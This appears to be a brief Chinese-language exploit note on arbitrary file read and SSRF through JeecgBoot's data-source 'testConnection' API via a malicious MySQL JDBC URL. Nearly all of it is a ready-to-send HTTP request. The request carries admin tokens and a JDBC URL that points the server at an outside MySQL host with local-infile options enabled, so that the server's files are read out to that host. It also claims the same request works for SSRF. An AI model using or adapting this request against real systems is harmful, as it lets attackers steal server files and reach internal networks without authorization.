# MySQL jdbc 任意文件读取以及SSRF

**任意文件读取**

java-chains生成好payload，直接填入即可

```http
POST /jeecgboot/online/cgreport/api/testConnection HTTP/1.1
Host: 192.168.239.1:3100
Content-Length: 260
X-Version: v3
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiY2xpZW50VHlwZSI6IlBDIiwiZXhwIjoxNzgxMjk1MDUyfQ.yfk9sZDZycWg7DsbdLF3gt_hbI1YqbqtrT5mVMNM5Po
X-TIMESTAMP: 1781231905528
X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiY2xpZW50VHlwZSI6IlBDIiwiZXhwIjoxNzgxMjk1MDUyfQ.yfk9sZDZycWg7DsbdLF3gt_hbI1YqbqtrT5mVMNM5Po
X-Sign: 36F235ADC3F2561F2F8FEA0508D0D370
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
X-Tenant-Id: 1000
Origin: http://192.168.239.1:3100
Referer: http://192.168.239.1:3100/monitor/datasource
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

{"dbType":"4","dbDriver":"com.mysql.cj.jdbc.Driver","dbUrl":"jdbc:mysql://47.108.81.166:3308/test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true&allowLoadLocalInfileInPath=/&maxAllowedPacket=655360&user=f747bc3","dbUsername":"f747bc3","dbPassword":"123"}
```

**SSRF**

在java-chains种选择ssrf，poc相同，成功读取

<img width="1621" height="503" alt="image" src="https://github.com/user-attachments/assets/d4d004f0-ecce-4d25-b8f9-22602be9bab0" />
